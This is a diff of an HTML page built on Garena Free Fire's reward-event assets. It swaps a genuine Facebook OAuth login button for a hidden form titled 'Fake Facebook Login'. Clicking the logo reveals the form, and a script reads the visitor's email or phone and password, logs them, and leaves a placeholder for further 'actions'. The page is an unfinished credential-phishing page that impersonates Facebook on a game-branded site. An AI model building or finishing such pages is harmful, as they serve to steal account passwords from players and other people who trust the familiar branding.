@@ -30,46 +30,51 @@
   </script>
   <link href="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/rewardFF/dist/global/assets/css/main.037c1ac475d55279eb78.css" rel="stylesheet">
   <style>
-    .login-button {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 200px;
-      height: 50px;
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-      font-weight: bold;
+    .free-fire-logo {
+      display: block;
+      width: 100px; /* Adjust the size as needed */
+      margin: 50px auto; /* Centering the logo */
     }
-
-    .login-button img {
-      width: 30px;
-      height: 30px;
-      margin-right: 10px;
+    .login-container {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .fake-facebook-login {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+    .fake-facebook-login input {
+      display: block;
+      margin: 10px auto;
     }
   </style>
 </head>
 <body>
   <div id="app">
-    <button class="login-button" onclick="facebookLogin()">
-      <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" alt="Free Fire Logo">
-      Login with Facebook
-    </button>
+    <div class="login-container">
+      <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" alt="Free Fire Logo" class="free-fire-logo" id="loginLogo">
+    </div>
+    <div class="fake-facebook-login" id="fakeFacebookLogin">
+      <h2>Fake Facebook Login</h2>
+      <input type="text" placeholder="Email or Phone" id="email">
+      <input type="password" placeholder="Password" id="password">
+      <button onclick="submitFakeLogin()">Log In</button>
+    </div>
   </div>
-  <script type="text/javascript" src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/rewardFF/dist/global/assets/js/vendors~main.75f0f793a533d9cfef89.js"></script>
-  <script type="text/javascript" src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/rewardFF/dist/global/assets/js/main.f75435ba013e05f807ff.js"></script>
-  <script>
-    function facebookLogin() {
-      const appId = 'YOUR_APP_ID'; // Replace with your Facebook App ID
-      const redirectUri = encodeURIComponent('YOUR_REDIRECT_URI'); // Replace with your redirect URI
-      const oauthUrl = `https://www.facebook.com/v10.0/dialog/oauth?client_id=${appId}&redirect_uri=${redirectUri}&response_type=token&scope=email`;
+  <script type="text/javascript">
+    document.getElementById('loginLogo').addEventListener('click', function() {
+      document.getElementById('fakeFacebookLogin').style.display = 'block';
+    });
 
-      console.log(`Redirecting to: ${oauthUrl}`); // Debug message to check the URL
-      window.location.href = oauthUrl;
+    function submitFakeLogin() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+      console.log('Fake login submitted:', email, password);
+      // Add any other actions you want to perform on fake login submission
     }
   </script>
+  <script type="text/javascript" src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/rewardFF/dist/global/assets/js/vendors~main.75f0f793a533d9cfef89.js"></script>
+  <script type="text/javascript" src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/rewardFF/dist/global/assets/js/main.f75435ba013e05f807ff.js"></script>
 </body>
 </html>
